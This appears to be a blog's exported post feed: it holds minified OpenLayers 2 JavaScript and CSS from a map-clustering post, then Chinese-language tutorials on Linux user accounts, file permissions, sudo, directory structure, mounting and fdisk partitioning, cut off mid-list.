g=0,h=d.length;g&lt;h;g++)&#123;c=&#123;&#125;;c.term=d[g].getAttribute("term");if(e=d[g].getAttribute("scheme"))c.scheme=e;if(e=d[g].getAttribute("label"))c.label=e;b.categories.push(c)&#125;d=this.getElementsByTagNameNS(a,f,"content");if(0&lt;d.length)&#123;c=&#123;&#125;;if(e=d[0].getAttribute("type"))c.type=e;(e=d[0].getAttribute("src"))?c.src=e:("text"==c.type||"html"==c.type||null==c.type?c.value=this.getFirstChildValue(a,f,"content",null):"xhtml"==c.type||c.type.match(/(\+|\/)xml$/)?c.value=this.getChildEl(d[0]):c.value=this.getFirstChildValue(a,f,"content",null),b.content=c)&#125;this.parsePersonConstructs(a,"contributor",b);b.id=this.getFirstChildValue(a,f,"id",null);d=this.getElementsByTagNameNS(a,f,"link");0&lt;d.length&amp;&amp;(b.links=Array(d.length));for(var k=["rel","type","hreflang","title","length"],g=0,h=d.length;g&lt;h;g++)&#123;c=&#123;&#125;;c.href=d[g].getAttribute("href");for(var l=0,m=k.length;l&lt;m;l++)(e=d[g].getAttribute(k[l]))&amp;&amp;(c[k[l]]=e);b.links[g]=c&#125;if(c=this.getFirstChildValue(a,f,"published",null))b.published=c;if(c=this.getFirstChildValue(a,f,"rights",null))b.rights=c;if(c=this.getFirstChildValue(a,f,"summary",null))b.summary=c;b.title=this.getFirstChildValue(a,f,"title",null);b.updated=this.getFirstChildValue(a,f,"updated",null);c=&#123;title:b.title,description:b.summary,atom:b&#125;;a=this.parseLocations(a)[0];a=new OpenLayers.Feature.Vector(a,c);a.fid=b.id;return a&#125;,parseFeatures:function(a)&#123;var b=[],c=this.getElementsByTagNameNS(a,this.namespaces.atom,"entry");0==c.length&amp;&amp;(c=[a]);a=0;for(var d=c.length;a&lt;d;a++)b.push(this.parseFeature(c[a]));return b&#125;,parseLocations:function(a)&#123;var b=this.namespaces.georss,c=&#123;components:[]&#125;,d=this.getElementsByTagNameNS(a,b,"where");if(d&amp;&amp;0&lt;d.length)&#123;this.gmlParser||this.initGmlParser();for(var e=0,f=d.length;e&lt;f;e++)this.gmlParser.readChildNodes(d[e],c)&#125;c=c.components;if((d=this.getElementsByTagNameNS(a,b,"point"))&amp;&amp;0&lt;d.length)for(e=0,f=d.length;e&lt;f;e++)&#123;var g=OpenLayers.String.trim(d[e].firstChild.nodeValue).split(/\s+/);2!=g.length&amp;&amp;(g=OpenLayers.String.trim(d[e].firstChild.nodeValue).split(/\s*,\s*/));c.push(new OpenLayers.Geometry.Point(g[1],g[0]))&#125;var h=this.getElementsByTagNameNS(a,b,"line");if(h&amp;&amp;0&lt;h.length)for(var k,e=0,f=h.length;e&lt;f;e++)&#123;d=OpenLayers.String.trim(h[e].firstChild.nodeValue).split(/\s+/);k=[];for(var l=0,m=d.length;l&lt;m;l+=2)g=new OpenLayers.Geometry.Point(d[l+1],d[l]),k.push(g);c.push(new OpenLayers.Geometry.LineString(k))&#125;if((a=this.getElementsByTagNameNS(a,b,"polygon"))&amp;&amp;0&lt;a.length)for(e=0,f=a.length;e&lt;f;e++)&#123;d=OpenLayers.String.trim(a[e].firstChild.nodeValue).split(/\s+/);k=[];l=0;for(m=d.length;l&lt;m;l+=2)g=new OpenLayers.Geometry.Point(d[l+1],d[l]),k.push(g);c.push(new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(k)]))&#125;if(this.internalProjection&amp;&amp;this.externalProjection)for(e=0,f=c.length;e&lt;f;e++)c[e]&amp;&amp;c[e].transform(this.externalProjection,this.internalProjection);return c&#125;,parsePersonConstructs:function(a,b,c)&#123;var d=[],e=this.namespaces.atom;a=this.getElementsByTagNameNS(a,e,b);for(var f=["uri","email"],g=0,h=a.length;g&lt;h;g++)&#123;var k=&#123;&#125;;k.name=this.getFirstChildValue(a[g],e,"name",null);for(var l=0,m=f.length;l&lt;m;l++)&#123;var n=this.getFirstChildValue(a[g],e,f[l],null);n&amp;&amp;(k[f[l]]=n)&#125;d.push(k)&#125;0&lt;d.length&amp;&amp;(c[b+"s"]=d)&#125;,CLASS_NAME:"OpenLayers.Format.Atom"&#125;);OpenLayers.Control.KeyboardDefaults=OpenLayers.Class(OpenLayers.Control,&#123;autoActivate:!0,slideFactor:75,observeElement:null,draw:function()&#123;this.handler=new OpenLayers.Handler.Keyboard(this,&#123;keydown:this.defaultKeyPress&#125;,&#123;observeElement:this.observeElement||document&#125;)&#125;,defaultKeyPress:function(a)&#123;var b,c=!0;b=OpenLayers.Event.element(a);if(!b||"INPUT"!=b.tagName&amp;&amp;"TEXTAREA"!=b.tagName&amp;&amp;"SELECT"!=b.tagName)&#123;switch(a.keyCode)&#123;case OpenLayers.Event.KEY_LEFT:this.map.pan(-this.slideFactor,0);break;case OpenLayers.Event.KEY_RIGHT:this.map.pan(this.slideFactor,0);break;case OpenLayers.Event.KEY_UP:this.map.pan(0,-this.slideFactor);break;case OpenLayers.Event.KEY_DOWN:this.map.pan(0,this.slideFactor);break;case 33:b=this.map.getSize();this.map.pan(0,-0.75*b.h);break;case 34:b=this.map.getSize();this.map.pan(0,0.75*b.h);break;case 35:b=this.map.getSize();this.map.pan(0.75*b.w,0);break;case 36:b=this.map.getSize();this.map.pan(-0.75*b.w,0);break;case 43:case 61:case 187:case 107:this.map.zoomIn();break;case 45:case 109:case 189:case 95:this.map.zoomOut();break;default:c=!1&#125;c&amp;&amp;OpenLayers.Event.stop(a)&#125;&#125;,CLASS_NAME:"OpenLayers.Control.KeyboardDefaults"&#125;);OpenLayers.Format.WMTSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.OWSCommon.v1_1_0,&#123;version:"1.0.0",namespaces:&#123;ows:"http://www.opengis.net/ows/1.1",wmts:"http://www.opengis.net/wmts/1.0",xlink:"http://www.w3.org/1999/xlink"&#125;,yx:null,defaultPrefix:"wmts",initialize:function(a)&#123;OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);this.options=a;a=OpenLayers.Util.extend(&#123;&#125;,OpenLayers.Format.WMTSCapabilities.prototype.yx);this.yx=OpenLayers.Util.extend(a,this.yx)&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=&#123;&#125;;this.readNode(a,b);b.version=this.version;return b&#125;,readers:&#123;wmts:&#123;Capabilities:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Contents:function(a,b)&#123;b.contents=&#123;&#125;;b.contents.layers=[];b.contents.tileMatrixSets=&#123;&#125;;this.readChildNodes(a,b.contents)&#125;,Layer:function(a,b)&#123;var c=&#123;styles:[],formats:[],dimensions:[],tileMatrixSetLinks:[],layers:[]&#125;;this.readChildNodes(a,c);b.layers.push(c)&#125;,Style:function(a,b)&#123;var c=&#123;&#125;;c.isDefault="true"===a.getAttribute("isDefault");this.readChildNodes(a,c);b.styles.push(c)&#125;,Format:function(a,b)&#123;b.formats.push(this.getChildValue(a))&#125;,TileMatrixSetLink:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.tileMatrixSetLinks.push(c)&#125;,TileMatrixSet:function(a,b)&#123;if(b.layers)&#123;var c=&#123;matrixIds:[]&#125;;this.readChildNodes(a,c);b.tileMatrixSets[c.identifier]=c&#125;else b.tileMatrixSet=this.getChildValue(a)&#125;,TileMatrix:function(a,b)&#123;var c=&#123;supportedCRS:b.supportedCRS&#125;;this.readChildNodes(a,c);b.matrixIds.push(c)&#125;,ScaleDenominator:function(a,b)&#123;b.scaleDenominator=parseFloat(this.getChildValue(a))&#125;,TopLeftCorner:function(a,b)&#123;var c=this.getChildValue(a).split(" "),d;b.supportedCRS&amp;&amp;(d=b.supportedCRS.replace(/urn:ogc:def:crs:(\w+):.+:(\w+)$/,"urn:ogc:def:crs:$1::$2"),d=!!this.yx[d]);b.topLeftCorner=d?new OpenLayers.LonLat(c[1],c[0]):new OpenLayers.LonLat(c[0],c[1])&#125;,TileWidth:function(a,b)&#123;b.tileWidth=parseInt(this.getChildValue(a))&#125;,TileHeight:function(a,b)&#123;b.tileHeight=parseInt(this.getChildValue(a))&#125;,MatrixWidth:function(a,b)&#123;b.matrixWidth=parseInt(this.getChildValue(a))&#125;,MatrixHeight:function(a,b)&#123;b.matrixHeight=parseInt(this.getChildValue(a))&#125;,ResourceURL:function(a,b)&#123;b.resourceUrl=b.resourceUrl||&#123;&#125;;var c=a.getAttribute("resourceType");b.resourceUrls||(b.resourceUrls=[]);c=b.resourceUrl[c]=&#123;format:a.getAttribute("format"),template:a.getAttribute("template"),resourceType:c&#125;;b.resourceUrls.push(c)&#125;,WSDL:function(a,b)&#123;b.wsdl=&#123;&#125;;b.wsdl.href=a.getAttribute("xlink:href")&#125;,ServiceMetadataURL:function(a,b)&#123;b.serviceMetadataUrl=&#123;&#125;;b.serviceMetadataUrl.href=a.getAttribute("xlink:href")&#125;,LegendURL:function(a,b)&#123;b.legend=&#123;&#125;;b.legend.href=a.getAttribute("xlink:href");b.legend.format=a.getAttribute("format")&#125;,Dimension:function(a,b)&#123;var c=&#123;values:[]&#125;;this.readChildNodes(a,c);b.dimensions.push(c)&#125;,Default:function(a,b)&#123;b["default"]=this.getChildValue(a)&#125;,Value:function(a,b)&#123;b.values.push(this.getChildValue(a))&#125;&#125;,ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows&#125;,CLASS_NAME:"OpenLayers.Format.WMTSCapabilities.v1_0_0"&#125;); style.css 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515div.olMap &#123; z-index: 0; padding: 0 !important; /*margin: 0 !important;*/ cursor: default;&#125;div.olMapViewport &#123; text-align: left; -ms-touch-action: none;&#125;div.olLayerDiv &#123; -moz-user-select: none; -khtml-user-select: none;&#125;.olLayerGoogleCopyright &#123; left: 2px; bottom: 2px;&#125;.olLayerGoogleV3.olLayerGoogleCopyright &#123; right: auto !important;&#125;.olLayerGooglePoweredBy &#123; left: 2px; bottom: 15px;&#125;.olLayerGoogleV3.olLayerGooglePoweredBy &#123; bottom: 15px !important;&#125;/* GMaps should not set styles on its container */.olForeignContainer &#123; opacity: 1 !important;&#125;.olControlAttribution &#123; font-size: smaller; right: 3px; bottom: 4.5em; position: absolute; display: block;&#125;.olControlScale &#123; right: 3px; bottom: 3em; display: block; position: absolute; font-size: smaller;&#125;.olControlScaleLine &#123; display: block; position: absolute; left: 10px; bottom: 15px; font-size: xx-small;&#125;.olControlScaleLineBottom &#123; border: solid 2px black; border-bottom: none; margin-top:-2px; text-align: center;&#125;.olControlScaleLineTop &#123; border: solid 2px black; border-top: none; text-align: center;&#125;.olControlPermalink &#123; right: 3px; bottom: 1.5em; display: block; position: absolute; font-size: smaller;&#125;div.olControlMousePosition &#123; bottom: 0; right: 3px; display: block; position: absolute; font-family: Arial; font-size: smaller;&#125;.olControlOverviewMapContainer &#123; position: absolute; bottom: 0; right: 0;&#125;.olControlOverviewMapElement &#123; padding: 10px 18px 10px 10px; background-color: #00008B; -moz-border-radius: 1em 0 0 0;&#125;.olControlOverviewMapMinimizeButton,.olControlOverviewMapMaximizeButton &#123; height: 18px; width: 18px; right: 0; bottom: 80px; cursor: pointer;&#125;.olControlOverviewMapExtentRectangle &#123; overflow: hidden; background-image: url("img/blank.gif"); cursor: move; border: 2px dotted red;&#125;.olControlOverviewMapRectReplacement &#123; overflow: hidden; cursor: move; background-image: url("img/overview_replacement.gif"); background-repeat: no-repeat; background-position: center;&#125;.olLayerGeoRSSDescription &#123; float:left; width:100%; overflow:auto; font-size:1.0em;&#125;.olLayerGeoRSSClose &#123; float:right; color:gray; font-size:1.2em; margin-right:6px; font-family:sans-serif;&#125;.olLayerGeoRSSTitle &#123; float:left;font-size:1.2em;&#125;.olPopupContent &#123; padding:5px; overflow: auto;&#125;.olControlNavigationHistory &#123; background-image: url("img/navigation_history.png"); background-repeat: no-repeat; width: 24px; height: 24px;&#125;.olControlNavigationHistoryPreviousItemActive &#123; background-position: 0 0;&#125;.olControlNavigationHistoryPreviousItemInactive &#123; background-position: 0 -24px;&#125;.olControlNavigationHistoryNextItemActive &#123; background-position: -24px 0;&#125;.olControlNavigationHistoryNextItemInactive &#123; background-position: -24px -24px;&#125;div.olControlSaveFeaturesItemActive &#123; background-image: url(img/save_features_on.png); background-repeat: no-repeat; background-position: 0 1px;&#125;div.olControlSaveFeaturesItemInactive &#123; background-image: url(img/save_features_off.png); background-repeat: no-repeat; background-position: 0 1px;&#125;.olHandlerBoxZoomBox &#123; border: 2px solid red; position: absolute; background-color: white; opacity: 0.50; font-size: 1px; filter: alpha(opacity=50);&#125;.olHandlerBoxSelectFeature &#123; border: 2px solid blue; position: absolute; background-color: white; opacity: 0.50; font-size: 1px; filter: alpha(opacity=50);&#125;.olControlPanPanel &#123; top: 10px; left: 5px;&#125;.olControlPanPanel div &#123; background-image: url(img/pan-panel.png); height: 18px; width: 18px; cursor: pointer; position: absolute;&#125;.olControlPanPanel .olControlPanNorthItemInactive &#123; top: 0; left: 9px; background-position: 0 0;&#125;.olControlPanPanel .olControlPanSouthItemInactive &#123; top: 36px; left: 9px; background-position: 18px 0;&#125;.olControlPanPanel .olControlPanWestItemInactive &#123; position: absolute; top: 18px; left: 0; background-position: 0 18px;&#125;.olControlPanPanel .olControlPanEastItemInactive &#123; top: 18px; left: 18px; background-position: 18px 18px;&#125;.olControlZoomPanel &#123; top: 71px; left: 14px;&#125;.olControlZoomPanel div &#123; background-image: url(img/zoom-panel.png); position: absolute; height: 18px; width: 18px; cursor: pointer;&#125;.olControlZoomPanel .olControlZoomInItemInactive &#123; top: 0; left: 0; background-position: 0 0;&#125;.olControlZoomPanel .olControlZoomToMaxExtentItemInactive &#123; top: 18px; left: 0; background-position: 0 -18px;&#125;.olControlZoomPanel .olControlZoomOutItemInactive &#123; top: 36px; left: 0; background-position: 0 18px;&#125;/* * When a potential text is bigger than the image it move the image * with some headers (closes #3154) */.olControlPanZoomBar div &#123; font-size: 1px;&#125;.olPopupCloseBox &#123; background: url("img/close.gif") no-repeat; cursor: pointer;&#125;.olFramedCloudPopupContent &#123; padding: 5px; overflow: auto;&#125;.olControlNoSelect &#123; -moz-user-select: none; -khtml-user-select: none;&#125;.olImageLoadError &#123; opacity: 0;&#125;/** * Cursor styles */.olCursorWait &#123; cursor: wait;&#125;.olDragDown &#123; cursor: move;&#125;.olDrawBox &#123; cursor: crosshair;&#125;.olControlDragFeatureOver &#123; cursor: move;&#125;.olControlDragFeatureActive.olControlDragFeatureOver.olDragDown &#123; cursor: -moz-grabbing;&#125;/** * Layer switcher */.olControlLayerSwitcher &#123; position: absolute; top: 25px; right: 0; width: 20em; font-family: sans-serif; font-weight: bold; margin-top: 3px; margin-left: 3px; margin-bottom: 3px; font-size: smaller; color: white; background-color: transparent;&#125;.olControlLayerSwitcher .layersDiv &#123; padding-top: 5px; padding-left: 10px; padding-bottom: 5px; padding-right: 10px; background-color: darkblue;&#125;.olControlLayerSwitcher .layersDiv .baseLbl,.olControlLayerSwitcher .layersDiv .dataLbl &#123; margin-top: 3px; margin-left: 3px; margin-bottom: 3px;&#125;.olControlLayerSwitcher .layersDiv .baseLayersDiv,.olControlLayerSwitcher .layersDiv .dataLayersDiv &#123; padding-left: 10px;&#125;.olControlLayerSwitcher .maximizeDiv,.olControlLayerSwitcher .minimizeDiv &#123; width: 18px; height: 18px; top: 5px; right: 0; cursor: pointer;&#125;.olBingAttribution &#123; color: #DDD;&#125;.olBingAttribution.road &#123; color: #333;&#125;.olGoogleAttribution.hybrid, .olGoogleAttribution.satellite &#123; color: #EEE;&#125;.olGoogleAttribution &#123; color: #333;&#125;span.olGoogleAttribution a &#123; color: #77C;&#125;span.olGoogleAttribution.hybrid a, span.olGoogleAttribution.satellite a &#123; color: #EEE;&#125;/** * Editing and navigation icons. * (using the editing_tool_bar.png sprint image) */.olControlNavToolbar ,.olControlEditingToolbar &#123; margin: 5px 5px 0 0;&#125;.olControlNavToolbar div,.olControlEditingToolbar div &#123; background-image: url("img/editing_tool_bar.png"); background-repeat: no-repeat; margin: 0 0 5px 5px; width: 24px; height: 22px; cursor: pointer&#125;/* positions */.olControlEditingToolbar &#123; right: 0; top: 0;&#125;.olControlNavToolbar &#123; top: 295px; left: 9px;&#125;/* layouts */.olControlEditingToolbar div &#123; float: right;&#125;/* individual controls */.olControlNavToolbar .olControlNavigationItemInactive,.olControlEditingToolbar .olControlNavigationItemInactive &#123; background-position: -103px -1px;&#125;.olControlNavToolbar .olControlNavigationItemActive ,.olControlEditingToolbar .olControlNavigationItemActive &#123; background-position: -103px -24px;&#125;.olControlNavToolbar .olControlZoomBoxItemInactive &#123; background-position: -128px -1px;&#125;.olControlNavToolbar .olControlZoomBoxItemActive &#123; background-position: -128px -24px;&#125;.olControlEditingToolbar .olControlDrawFeaturePointItemInactive &#123; background-position: -77px -1px;&#125;.olControlEditingToolbar .olControlDrawFeaturePointItemActive &#123; background-position: -77px -24px;&#125;.olControlEditingToolbar .olControlDrawFeaturePathItemInactive &#123; background-position: -51px -1px;&#125;.olControlEditingToolbar .olControlDrawFeaturePathItemActive &#123; background-position: -51px -24px;&#125;.olControlEditingToolbar .olControlDrawFeaturePolygonItemInactive&#123; background-position: -26px -1px;&#125;.olControlEditingToolbar .olControlDrawFeaturePolygonItemActive &#123; background-position: -26px -24px;&#125;div.olControlZoom &#123; position: absolute; top: 8px; left: 8px; background: rgba(255,255,255,0.4); border-radius: 4px; padding: 2px;&#125;div.olControlZoom a &#123; display: block; margin: 1px; padding: 0; color: white; font-size: 18px; font-family: 'Lucida Grande', Verdana, Geneva, Lucida, Arial, Helvetica, sans-serif; font-weight: bold; text-decoration: none; text-align: center; height: 22px; width:22px; line-height: 19px; background: #130085; /* fallback for IE - IE6 requires background shorthand*/ background: rgba(0, 60, 136, 0.5); filter: alpha(opacity=80);&#125;div.olControlZoom a:hover &#123; background: #130085; /* fallback for IE */ background: rgba(0, 60, 136, 0.7); filter: alpha(opacity=100);&#125;@media only screen and (max-width: 600px) &#123; div.olControlZoom a:hover &#123; background: rgba(0, 60, 136, 0.5); &#125;&#125;a.olControlZoomIn &#123; border-radius: 4px 4px 0 0;&#125;a.olControlZoomOut &#123; border-radius: 0 0 4px 4px;&#125;/** * Animations */.olLayerGrid .olTileImage &#123; -webkit-transition: opacity 0.2s linear; -moz-transition: opacity 0.2s linear; -o-transition: opacity 0.2s linear; transition: opacity 0.2s linear;&#125;/* Turn on GPU support where available */.olTileImage &#123; -webkit-transform: translateZ(0); -moz-transform: translateZ(0); -o-transform: translateZ(0); -ms-transform: translateZ(0); transform: translateZ(0); -webkit-backface-visibility: hidden; -moz-backface-visibility: hidden; -ms-backface-visibility: hidden; backface-visibility: hidden; -webkit-perspective: 1000; -moz-perspective: 1000; -ms-perspective: 1000; perspective: 1000;&#125;/* when replacing tiles, do not show tile and backbuffer at the same time */.olTileReplacing &#123; display: none;&#125;/* override any max-width image settings (e.g. bootstrap.css) */img.olTileImage &#123; max-width: none;&#125;css 标注的图标文件： http://pqpog12fm.bkt.clouddn.com/pins.png http://pqpog12fm.bkt.clouddn.com/pinsback.png 项目文件： http://pqpog12fm.bkt.clouddn.com/ol2%E8%81%9A%E5%90%88%E5%9B%BE.zip]]></content>
      <categories>
        <category>GIS </category>
      </categories>
      <tags>
        <tag>GIS</tag>
        <tag>openlayer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux用户身份与文件权限]]></title>
    <url>%2F%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD%E4%B8%8E%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%2F</url>
    <content type="text"><![CDATA[用户身份与文件权限 用户 1.管理员 root UID: 0 系统用户 5/6 UID: 1-499 红帽7 UID 1-999 /sbin/nologin 3.普通用户 5/6 500-655357 1000- 1234567891011121314151617181920 id xps # 查看用户信息 useradduseradd -u 555 xps # 新建用户并指定uiduseradd -u ssbin/nologin xps # 指定终端addusergroupadd hhh # 新建用户组usermod -G hhh xps # 基本组/扩展组usermod -u 666 xps # 修改uidgroupdel hhh # 删除用户组passwd xps # 重置密码userdel xps # 删除用户(不删除home等)userdel -r xps # 删除用户(信息全删除）deluser#修改name的话可以直接去 /etc/passwd修改 文件权限 1234567文件类型➢ -：普通文件。➢ d：目录文件。➢ l：链接文件。➢ b：块设备文件。➢ c：字符设备文件。➢ p：管道文件。 1234567891011121314r读4w写2x执行1===============chmod # 权限 格式为“chown [参数] 所有者:所属组 文件或目录名称” chown root:bin testchown # 所有者，属性-Rf # 强制的意思chmod -Rf 777 test/chmod -Rf g+s test/ # 并为该目录设置了 SGID 特殊权限位chmod -R o+t linux/ # 设置sbit权限 保护位 文件的特殊权限 1234567891011121314151617181920212223242526272829303132333435363738394041424344451.**SUID** # 让程序执行者，临时获取程序所有者的身份（仅对拥有执行权限的二进制程序有效）u+s 42.**SGID** # 让程序执行者，临时获取程序所有组的身份 让目录内的新建文件，集成目录所有组的名称 g+s 2 3.**SBIT** #让目录内的文件，**只能自己删除自己**的RHEL 7 系统中的/tmp 作为一个共享文件的目录，默认已经设置了 SBIT 特殊权限位，因此除非是该目录的所有者，否则无法删除这里面的文件；当目录被设置 SBIT 特殊权限位后，文件的其他人权限部分的 x 执行权限就会被替换成 t 或者 T，原本有 x 执行权限则会写成 t，原本没有 x 执行权限则会被写成 To+t 1suid: x 改变成 s 就意味着该文件被赋予了 SUID 权限。如果原本的权限是 rw-呢？如果原先权限位上没有 x 执行权限，那么被赋予特殊权限后将变成大写的 Ss 证明原先有xS 证明原先没有xsgid: s 证明原先有xS 证明原先没有xsbit: 对其他目录来设置 SBIT 特殊权限位，用 chmod 命令就可以了。对应的参数 o+t 代表设置 SBIT 粘滞位权限：t 证明原先有T 证明原先没有x例如： 转换7654 # 7是特殊权限位， 654是一一般权限位 420 401 400 rw- r-x r-- 7: = 4+2+1 三个都涉及了,所以要都加上 # S-&gt;之前没有x权限，s-&gt;之前有x权限,T-&gt;之前没有... rwSrwsr-T======rwsr--rwTrwxr--rw- 746s=4,T=45746======r-Srws--T5470 文件的隐藏属性 12341.chattr 设置文件的隐藏权限，格式为“chattr [参数] 文件” chattr +a /var/log/message2. lsattr 显示文件的隐藏权限，格式为“lsattr [参数] 文件” lsattr -d Desktop/ $ 查看目录的... 表 5-6 chattr 命令中用于隐藏权限的参数及其作用 参数 含义 i 无法对文件进行修改；若对目录设置了该参数，则仅能修改其中的子文件内容而不能新建或删除文件 a 仅允许补充（追加）内容，无法覆盖/删除内容（Append Only） S 文件内容在变更后立即同步到硬盘（sync） s 彻底从硬盘中删除，不可恢复（用 0 填充原文件所在硬盘区域） A 不再修改这个文件或目录的最后访问时间（atime） b 不再修改文件或目录的存取时间 D 检查压缩文件中的错误 d 使用 dump 命令备份时忽略本文件/目录 c 默认将文件或目录进行压缩 u 当删除该文件后依然保留其在硬盘中的数据，方便日后恢复 t 让文件系统支持尾部合并（tail-merging） X 可以直接访问压缩文件中的内容 文件访问控制列表 ACL 12对某个指定的用户进行单独的权限控制 如果针对某个目录设置了 ACL，则目录中的文件会继承其 ACL；若针对文件设置了 ACL，则文件不再继承其所在目录的 ACL 1234567891.setfacl 命令(针对目录文件需要使用-R 递归参数；针对普通文件则使用-m 参数；如果想要删除某个文件的 ACL，则可以使用-b 参数) setfacl -Rm u:xps:rwx /root # -m 修改 setfacl -Rm g:xpsg:r-x /tmp看到文件的权限最后一个点（.）变成了加号（+） ,这就意味着该文件已经设置了 ACL 了。2.getfacl su 与sudo 1234567891011121314151617181920212223242526272829303132333435363738394041424344su - xpssu 命令与用户名之间有一个减号（-），这意味着完全切换到新的用户，即把环境变量信息也变更为新用户的相应信息，而不是保留原始的信息。强烈建议在切换用户身份时添加这个减号（-）使用 sudo 命令把特定命令的执行权限赋予给指定用户(避免泄露 root 管理员密码)**sudo 服务中的可用参数以及作用** -h 列出帮助信息-l 列出当前用户可执行的命-u 用户名或 UID 值 以指定的用户身份执行命-k 清空密码的有效时间，下-b 在后台执行指定的命令-p 更改询问密码的提示语**sudo 命令具有如下功能：**➢ 限制用户执行指定的命令：➢ 记录用户执行的每一条命令；➢ 配置文件（/etc/sudoers）提供集中的用户管理、权限与主机等参数；➢ 验证密码的后 5 分钟内（默认值）无须再让用户再次验证密码。使用 sudo 命令提供的 visudo 命令来配置用户权限。这条命令在配置用户权限时将禁止多个用户同时修改 sudoers 配置文件，还可以对配置文件内的参数进行语法检查，并在发现参数错误时进行报错。(只有root才能使用visudo编辑所服务的配置文件)在 sudo 命令的配置文件中，按照下面的格式将第 99 行（大约）填写上指定的信息：谁可以使用 允许使用的主机=(以谁的身份) 可执行命令的列表xps ALL=(ALL) ALL如果需要让某个用户只能使用 root 管理员的身份执行指定的命令，切记一定要给出该命令的绝对路径，否则系统会识别不出来。先使用 whereis 命令找出命令所对应的保存路径，然后把配置文件第 99 行的用户权限参数修改成对应的路径即可xps ALL=(ALL) /usr/bin/cat加 NOPASSWD 参数，使得用户执行 sudo 命令时不再需要密码验证： xps ALL=NOPASSWD: /usr/sbin/poweroff]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>用户身份</tag>
        <tag>Linux，文件权限</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux存储结构与磁盘划分]]></title>
    <url>%2Frhel7%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E7%A3%81%E7%9B%98%E5%88%92%E5%88%86%2F</url>
    <content type="text"><![CDATA[存储结构与磁盘划分123456789101112131415161718/boot 开机所需文件—内核、开机菜单以及所需配置文件等/dev 以文件形式存放任何设备与接口 # /etc 配置文件 #/home 用户家目录 # /bin 存放单用户模式下还可以操作的命令/lib 开机时用到的函数库，以及/bin 与/sbin 下面的命令要调用的函数/sbin 开机过程中需要的命令/media 用于挂载设备文件的目录 # /opt 放置第三方的软件/root 系统管理员的家目录 # /srv 一些网络服务的数据文件目录/tmp 任何人均可使用的“共享”临时目录/proc 虚拟文件系统，例如系统内核、进程、外部设备及网络状态等 # /usr/local 用户自行安装的软件 # /usr/sbin Linux 系统开机时不会使用到的软件/命令/脚本/usr/share 帮助与说明文件，也可放置共享文件 # /var 主要存放经常变化的文件，如日志 # /lost+found 当文件系统发生错误时，将一些丢失的文件片段存放在这里 1234567891011121314151617常见的硬件设备及其文件名称IDE 设备 /dev/hd[a-d]SCSI/SATA/U 盘 /dev/sd[a-p]软驱 /dev/fd[0-1]打印机 /dev/lp[0-15]光驱 /dev/cdrom鼠标 /dev/mouse磁带机 /dev/st0 或/dev/ht0系统采用 a～p 来代表 16 块不同的硬盘（默认从 a 开始分配），而且硬盘的分区编号也很有讲究：➢ 主分区或扩展分区的编号从 1 开始，到 4 结束；➢ 逻辑分区从编号 5 开始。主分区不能超过 4 个 挂载硬件设备mount 命令12345678910111213141516171819202122232425262728用于挂载文件系统，格式为“mount 文件系统 挂载目录”mount 命令中的参数以及作用-a 挂载所有在/etc/fstab 中定义的文件系统 ,执行后自动检查/etc/fstab 文件中有无疏漏被挂载的设备文件，如果有，则进行自动挂载操作-t 指定文件系统的类型例如，要把设备/dev/sdb2 挂载到/backup 目录:mount /dev/sdb2 /backup # 重启后挂载就会失效#永久配置把挂载信息按照指定的填写格式“设备文件 挂载目录 格式类型 权限选项 是否备份 是否自检”写入到 /etc/fstab 文件中#用于挂载信息的指定填写格式中，各字段所表示的意义设备文件 一 般 为 设 备 的 路 径 + 设 备 名 称 ， 也 可 以 写 唯 一 识 别 码 （ UUID ，Universally Unique Identifier）挂载目录 指定要挂载到的目录，需在挂载前创建好格式类型 指定文件系统的格式，比如 Ext3、 Ext4、 XFS、 SWAP、 iso9660（此为光盘设备）等权限选项 若设置为 defaults，则默认权限为： rw, suid, dev, exec, auto, nouser, async是否备份 若为 1 则开机后使用 dump 进行磁盘备份，为 0 则不备份是否自检 若为 1 则开机后自动进行磁盘自检，为 0 则不自检#例如：将文件系统为 ext4 的硬件设备/dev/sdb2 在开机后自动挂载到/backup 目录上，并保持默认权限且无需开机自检vim /etc/fstab/dev/sdb2 /backup ext4 defaults 0 0 umount 命令 123umount [挂载点/设备文件]umount /dev/sdb2 添加硬盘设备 123#操作思路：首先需要在虚拟机中模拟添加入一块新的硬盘存储设备，然后再进行分区、格式化、挂载等操作，最后通过检查系统的挂载状态并真实地使用硬盘来验证硬盘设备是否成功添加现在虚拟机中添加一个新的虚拟硬盘 fdisk 命令 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&quot;fdisk [磁盘名称]&quot;，它提供了集添加、删除、转换分区等功能于一身的“一站式分区服务”交互式#fdisk 命令中的参数以及作用m 查看全部可用的参数n 添加新的分区d 删除某个分区信息l 列出所有可用的分区类型t 改变某个分区的类型p 查看分区信息 w 保存并退出q 